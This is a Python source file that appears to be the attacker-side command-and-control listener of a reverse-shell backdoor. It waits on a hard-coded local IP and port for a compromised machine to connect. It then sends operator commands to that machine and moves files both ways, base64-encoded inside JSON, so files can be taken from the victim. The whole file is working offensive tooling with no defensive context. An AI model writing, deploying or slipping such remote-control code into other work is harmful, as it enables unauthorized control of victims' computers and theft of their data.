import socket
import simplejson
import base64

class SocketListener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("Listening ...")
        (self.connection,address) = listener.accept()
        print("Connection OK from " + str(address))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_exec(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":
            self.connection.close()
            exit()
        return self.json_receive()

    def save_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "Download OK"

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def start_listener(self):
        while True:
            command_input = input("Enter command : ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    file_content = self.read_file(command_input[1])
                    command_input.append(file_content)

                command_output = self.command_exec(command_input)

                if command_input[0] == "download" and "ERROR!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
                command_output = "Error"
            print(command_output)


socket_listener_object = SocketListener("192.168.1.7",8080)
socket_listener_object.start_listener()